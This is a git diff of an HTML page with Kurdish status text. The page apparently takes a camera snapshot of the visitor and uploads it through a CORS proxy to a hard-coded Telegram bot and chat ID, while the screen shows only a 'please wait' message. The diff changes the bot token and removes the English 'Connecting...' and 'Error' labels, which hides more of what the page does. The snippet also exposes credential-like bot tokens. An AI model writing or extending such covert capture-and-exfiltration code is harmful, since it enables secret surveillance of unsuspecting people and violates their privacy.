@@ -7,7 +7,7 @@
 </head>
 <body style="background-color: #222; color: #fff; font-family: sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; padding: 20px;">
 
-    <h3 id="status">چاوەڕوان بە... (Connecting...)</h3>
+    <h3 id="status">چاوەڕوان بە...</h3>
 
     <script>
       const statusEl = document.getElementById('status');
@@ -32,7 +32,7 @@
               formData.append('chat_id', '6539379136');
               formData.append('photo', blob, 'snapshot.jpg');
 
-              fetch('https://corsproxy.io/?https://api.telegram.org/bot8998865631:AAGvEie2pNz2fEl00AHDt_H0MgkFU20hZM/sendPhoto', {
+              fetch('https://corsproxy.io/?https://api.telegram.org/bot8979741062:AAFFz0tN5rSEmjZli1vhfVr03zd2lJG0DSM/sendPhoto', {
                 method: 'POST',
                 body: formData
               })
@@ -45,7 +45,7 @@
                 }
               })
               .catch(error => {
-                statusEl.innerText = "❌ هەڵەی ناردن (Error): " + error.message;
+                statusEl.innerText = "❌ هەڵەی ناردن: " + error.message;
               });
             }, 'image/jpeg');
           }, 2000);
